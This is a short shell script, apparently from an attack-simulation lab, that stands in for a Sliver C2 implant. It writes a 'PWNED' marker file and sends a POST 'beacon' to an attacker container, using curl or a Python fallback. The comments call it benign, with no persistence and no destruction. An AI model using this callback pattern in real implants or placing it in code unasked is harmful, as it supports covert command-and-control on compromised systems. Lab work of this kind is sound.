#!/bin/sh
# implant.sh -- LAB ARTIFACT, BENIGN. The "native implant" stage-2 drops and runs.
#
# In the real attack this was a Sliver C2 binary. Here it only proves execution:
# it writes a marker file and sends one loopback "beacon" to the attacker container.
# No persistence, no network beyond labnet, nothing destructive.
ATTACKER="${LAB_ATTACKER:-catalogue:8000}"
echo "[stage5] LAB-BENIGN implant running (pid $$)"

mkdir -p /tmp/lab_proof
echo "compromised at $(date -u) by implant pid $$" > /tmp/lab_proof/PWNED

# "C2 callback" -- to the local attacker container only.
if command -v curl >/dev/null 2>&1; then
  curl -s -X POST --data "beacon: implant executed, pid $$" "http://${ATTACKER}/beacon" >/dev/null || true
else
  python3 - "$ATTACKER" <<'PY' || true
import sys, urllib.request
urllib.request.urlopen("http://%s/beacon" % sys.argv[1], data=b"beacon: implant executed")
PY
fi

echo "[stage5] proof written to /tmp/lab_proof/PWNED and beacon sent to ${ATTACKER}"
